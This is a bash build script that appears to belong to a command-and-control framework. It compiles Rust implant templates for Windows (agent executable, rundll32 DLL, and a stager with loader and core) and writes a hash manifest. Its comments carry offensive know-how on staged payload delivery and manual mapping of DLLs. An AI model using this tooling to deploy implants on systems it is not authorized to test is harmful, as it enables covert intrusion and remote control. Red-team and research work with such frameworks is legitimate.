#!/usr/bin/env bash
# Builds the Rust payload templates (windows_amd64) and copies them into
# server/templates:
#
#   rs_agent_*        standalone agent exe (embedded config slot)
#   rs_agent_*.dll    rundll32-loadable cdylib (exports WispStart/WispStartEx)
#   rs_stager         one-time GET /stage/<token> -> loader' + core' + cfg tail
#
# The layered trio is built for x86_64-pc-windows-gnu on purpose: the msvc
# runtime keys thread_local storage by a TLS index the OS loader must register,
# which is silently corrupted under manual mapping (verified: garbage reads +
# thread spawn abort). The gnu runtime works fully under the wisp-map mapper.
# The standalone exe/DLL are loaded by the OS, so either toolchain works; they
# use the same GNU toolchain here to keep one manifest.
#
# Env: WISP_RS_TC        rustup toolchain override
#      WISP_RS_FORMATS   comma list: agent,dll,staged (default all)
#      WISP_RS_OUT       output dir (default server/templates)
set -euo pipefail
cd "$(dirname "$0")/.."

TC="${WISP_RS_TC:-stable-x86_64-pc-windows-gnu}"
TARGET=x86_64-pc-windows-gnu
RUST_DIR=agent/agent-rs
OUT="${WISP_RS_OUT:-server/templates}"
FORMATS="${WISP_RS_FORMATS:-agent,dll,staged}"
WANT_AGENT=0; WANT_DLL=0; WANT_STAGED=0
IFS=',' read -ra _formats <<< "$FORMATS"
for f in "${_formats[@]}"; do
  case "$f" in
    agent) WANT_AGENT=1 ;;
    dll) WANT_DLL=1 ;;
    staged) WANT_STAGED=1 ;;
    *) echo "build-rs-templates: unknown format '$f'" >&2; exit 1 ;;
  esac
done
if [ $((WANT_AGENT + WANT_DLL + WANT_STAGED)) -eq 0 ]; then
  echo "build-rs-templates: nothing to build (formats=$FORMATS)" >&2
  exit 1
fi
if [ "${WISP_ALLOW_DIRTY:-0}" != "1" ] && [ -n "$(git status --porcelain 2>/dev/null)" ]; then
  echo "build-rs-templates: worktree is dirty; set WISP_ALLOW_DIRTY=1 to build test templates" >&2
  exit 1
fi

# rust-mingw's bundled dlltool cannot create import libraries; provide one.
# Prefer a real dlltool on PATH, fall back to shims over LLVM's llvm-dlltool.
if ! command -v dlltool >/dev/null 2>&1; then
  if [ -x .tools/bin/dlltool.exe ]; then
    export PATH="$PWD/.tools/bin:$PATH"
  elif [ -x "/c/Program Files/LLVM/bin/llvm-dlltool.exe" ]; then
    mkdir -p .tools/bin
    cp "/c/Program Files/LLVM/bin/llvm-dlltool.exe" .tools/bin/dlltool.exe
    cp "/c/Program Files/LLVM/bin/llvm-dlltool.exe" .tools/bin/x86_64-w64-mingw32-dlltool.exe
    export PATH="$PWD/.tools/bin:$PATH"
  else
    echo "build-rs-templates: dlltool not found (install mingw-w64 or LLVM)" >&2
    exit 1
  fi
fi

if [ "$WANT_AGENT" = "1" ] || [ "$WANT_DLL" = "1" ]; then
  # Direct agent/DLL templates carry the `quic` transport (plan P6, decision
  # #7: feature-gated so source/staged builds stay lean). quic pulls in ring,
  # which needs a real mingw gcc on the windows-gnu target — use the repo
  # bundled toolchain when no system gcc is visible.
  if [ -z "${CC_x86_64_pc_windows_gnu:-}" ] && ! command -v gcc >/dev/null 2>&1; then
    if [ -x .tools/mingw-dl/mingw64/bin/gcc.exe ] \
      && [ -f .tools/mingw-dl/mingw64/x86_64-w64-mingw32/include/stddef.h ]; then
      export CC_x86_64_pc_windows_gnu="$PWD/.tools/mingw-dl/mingw64/bin/gcc.exe"
    else
      echo "build-rs-templates: quic needs mingw gcc (extract .tools/mingw-dl/mingw.zip fully — bin+libexec+lib+x86_64-w64-mingw32 — or set CC_x86_64_pc_windows_gnu)" >&2
      exit 1
    fi
  fi
  (cd "$RUST_DIR" && cargo "+$TC" build --release --target "$TARGET" \
    -p wisp-agent-rs --bin wisp-agent-rs --lib --features quic)
fi
if [ "$WANT_STAGED" = "1" ]; then
  (cd "$RUST_DIR" && cargo "+$TC" build --release --target "$TARGET" \
    -p wisp-stager -p wisp-loader -p wisp-core)
fi

D="$RUST_DIR/target/$TARGET/release"
mkdir -p "$OUT"
FILES=()
if [ "$WANT_AGENT" = "1" ]; then
  cp "$D/wisp-agent-rs.exe" "$OUT/rs_agent_windows_amd64.exe"
  FILES+=(rs_agent_windows_amd64.exe)
fi
if [ "$WANT_DLL" = "1" ]; then
  cp "$D/wisp_agent_rs.dll" "$OUT/rs_agent_windows_amd64.dll"
  FILES+=(rs_agent_windows_amd64.dll)
fi
if [ "$WANT_STAGED" = "1" ]; then
  cp "$D/wisp-stager.exe" "$OUT/rs_stager_windows_amd64.exe"
  cp "$D/session_loader.dll" "$OUT/rs_loader_windows_amd64.dll"
  cp "$D/session_core.dll" "$OUT/rs_core_windows_amd64.dll"
  FILES+=(rs_stager_windows_amd64.exe rs_loader_windows_amd64.dll rs_core_windows_amd64.dll)
fi

# Build manifest: the console verifies template hashes against this file and
# shows which commit the payloads were generated from.
GIT_REV=$(git rev-parse --short=12 HEAD 2>/dev/null || echo unknown)
if [ -n "$(git status --porcelain 2>/dev/null)" ]; then DIRTY=true; else DIRTY=false; fi
BUILT_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
FEATURES='"rcp", "view", "file"'
if [ "$WANT_AGENT" = "1" ] || [ "$WANT_DLL" = "1" ]; then FEATURES="$FEATURES, \"quic\""; fi
if [ "$WANT_STAGED" = "1" ]; then FEATURES="$FEATURES, \"staged-rs\""; fi
if [ "$WANT_DLL" = "1" ]; then FEATURES="$FEATURES, \"dll\""; fi
{
  printf '{
  "schema": 2,
  "kind": "rs",
  "agent": "rust",
  "toolchain": "rust-%s",
  "features": [%s],
  "source": "prebuilt",
  "git": "%s",
  "dirty": %s,
  "built_at": "%s",
  "files": [
'     "$TARGET" "$FEATURES" "$GIT_REV" "$DIRTY" "$BUILT_AT"
  first=1
  for f in "${FILES[@]}"; do
    sum=$(sha256sum "$OUT/$f" | cut -d' ' -f1)
    size=$(stat -c %s "$OUT/$f")
    [ "$first" = "1" ] || printf ',
'
    first=0
    printf '    {"name": "%s", "sha256": "%s", "size": %s}' "$f" "$sum" "$size"
  done
  printf '
  ]
}
'
} > "$OUT/rs_manifest.json"
ls -l "$OUT"/rs_*
